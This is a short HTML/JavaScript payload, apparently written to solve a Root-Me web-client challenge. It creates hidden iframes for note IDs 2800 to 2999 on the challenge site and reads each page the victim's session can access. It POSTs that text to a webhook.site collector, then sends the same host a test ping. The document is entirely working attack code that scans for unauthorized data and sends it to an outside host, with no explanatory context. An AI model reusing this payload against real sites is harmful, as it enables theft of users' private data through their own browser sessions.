<script>
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";

function run(a = 2800, b = 3000) {
    const container = document.body || document.documentElement;

    for (let i = a; i < b; i++) {
        const iframe = document.createElement("iframe");
        iframe.style.display = "none";

        iframe.onload = () => {
            try {
                const doc = iframe.contentDocument;
                const text = doc.body.textContent.trim();

                if (!text.includes("not authorized")) {
                    console.log("FOUND", i);

                    fetch(WEBHOOK, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            id: i,
                            data: text
                        })
                    });
                }
            } catch (e) {
                console.log("error", i);
            }

            iframe.remove();
        };

        iframe.src = TARGET + i;
        container.appendChild(iframe);
    }
}

run();
fetch(WEBHOOK + "?test=yes");
</script>
